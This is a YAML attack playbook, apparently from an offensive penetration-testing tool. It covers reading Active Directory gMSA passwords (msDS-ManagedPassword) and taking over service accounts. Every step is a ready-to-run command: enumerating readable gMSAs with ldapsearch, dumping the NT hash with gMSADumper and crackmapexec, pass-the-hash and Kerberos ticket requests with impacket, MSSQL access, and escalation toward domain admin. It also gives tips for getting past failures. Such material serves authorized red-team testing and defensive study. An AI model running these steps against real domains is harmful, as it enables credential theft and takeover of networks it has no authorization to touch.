chain_id: gmsa_password_read
title: "AD — gMSA (msDS-ManagedPassword) read → service account take-over"
severity: HIGH
tags: [ad, gmsa, msds-managedpassword, ldap, dacl-abuse, kerberos]

trigger:
  any_of:
    - { kind: "gmsa_read_rights" }
    - { kind: "domain_user_credentials" }

description: |
  Group Managed Service Accounts hold their password in
  `msDS-ManagedPassword` — a 256-bit blob the DC rotates every 30 days.
  Any principal listed in `msDS-GroupMSAMembership` (or with explicit
  read on the attribute) can pull the blob and derive the NT hash.
  Common over-privilege: helpdesk groups, dev teams, BloodHound
  surfaces these as `ReadGMSAPassword` edges. The recovered hash
  belongs to a service account — typically with rights on whichever
  service it runs (SQL, AD CS, …).

steps:
  - id: 1
    title: "Find gMSAs and who can read them"
    command: |
      # BloodHound Cypher:
      #   MATCH p=(a)-[:ReadGMSAPassword]->(g) RETURN p
      # Or:
      ldapsearch -x -H ldap://$DC_IP -D 'USER@DOMAIN' -w 'PASS' \
        -b 'DC=DOMAIN,DC=LOCAL' '(objectClass=msDS-GroupManagedServiceAccount)' \
        sAMAccountName msDS-GroupMSAMembership

  - id: 2
    title: "Pull the password blob and derive the NT hash"
    command: |
      git clone https://github.com/micahvandeusen/gMSADumper /tmp/gmsa
      python3 /tmp/gmsa/gMSADumper.py -u USER -p 'PASS' -d DOMAIN -l $DC_IP

  - id: 3
    title: "With netexec (ldap module)"
    command: |
      crackmapexec ldap $DC_IP -u USER -p 'PASS' --gmsa
      # Outputs:
      #   svc_sql$ :aad3b435b51404eeaad3b435b51404ee:<NT>

  - id: 4
    title: "Use the NT hash — pass-the-hash"
    command: |
      crackmapexec smb TARGET -u 'svc_sql$' -H ':<NT>' -d DOMAIN
      impacket-getTGT DOMAIN/'svc_sql$' -hashes :<NT> -dc-ip $DC_IP
      export KRB5CCNAME=svc_sql\$.ccache
      impacket-mssqlclient -k -no-pass TARGET -windows-auth

  - id: 5
    title: "If the gMSA is over-privileged, jump to DA"
    command: |
      # Check group memberships:
      net user 'svc_sql$' /domain
      # Often gMSAs hold local admin on file servers, MSSQL with
      # sysadmin role, ADCS publisher rights, etc. → standard escalation.

common_errors:
  - error: "msDS-ManagedPassword returns empty"
    solution: |
      You're not in `msDS-GroupMSAMembership` — the DC strips the
      attribute when not authorized. Add yourself if you have
      GenericWrite on the gMSA (BloodHound shows this as
      `WriteGMSAPassword`-ish path).
  - error: "gMSADumper: 'Confidentiality required'"
    solution: |
      LDAP signing/binding required (default since 2024-Q1 hardening
      KBs). Re-run with LDAPS: `-L ldaps://$DC_IP`. Or rebind via
      LDAP_OPT_X_SASL_MAXSSF.

references:
  - https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview
  - https://github.com/micahvandeusen/gMSADumper
